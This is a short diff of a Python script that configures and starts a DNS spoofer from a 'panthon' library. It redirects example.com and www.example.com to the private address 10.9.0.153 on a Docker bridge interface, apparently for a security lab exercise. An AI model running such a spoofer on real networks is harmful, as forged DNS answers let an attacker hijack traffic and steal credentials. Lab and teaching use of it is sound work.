@@ -1,12 +1,9 @@
 from panthon import DNSSpoofer
 
-interface = "eth0"  # your network interface
-
-# Specify the host you want to spoof DNS responses for and the IP to redirect to
 spoofing_rules = {
-    "www.example.com.": "192.0.2.0",
-    "www.test.com.": "203.0.113.0",
+    "www.example.com.": "10.9.0.153",
+    "example.com.": "10.9.0.153" 
 }
 
-dns_spoofer = DNSSpoofer(interface, spoofing_rules)
-dns_spoofer.start()
+spoofer = DNSSpoofer('br-6e22e6f96755', spoofing_rules)  # Adjust interface as needed
+spoofer.start()
